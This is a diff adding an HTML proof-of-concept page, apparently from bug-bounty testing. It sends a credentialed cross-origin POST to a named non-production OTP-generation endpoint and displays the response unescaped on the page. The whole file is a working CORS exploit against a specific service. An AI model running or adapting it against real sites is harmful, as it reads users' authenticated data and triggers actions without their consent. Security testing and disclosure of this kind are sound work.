@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head><title>CORS PoC</title></head>
+  <body>
+    <h1>CORS Exploit Test</h1>
+    <script>
+      fetch("https://api-uat-bugbounty.nonprod.syfe.com/auth/mobile-verification/generate-otp?locale=en-sg", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "X-SV-Client-Id": "web",
+          "X-SV-Client-Version": "1.0",
+          "X-SV-Client-Type": "web"
+        },
+        body: JSON.stringify({ phone: "+123456789" })
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Data received:", data);
+        document.body.innerHTML += `<pre>${data}</pre>`;
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        document.body.innerHTML += `<pre>${err}</pre>`;
+      });
+    </script>
+  </body>
+</html>
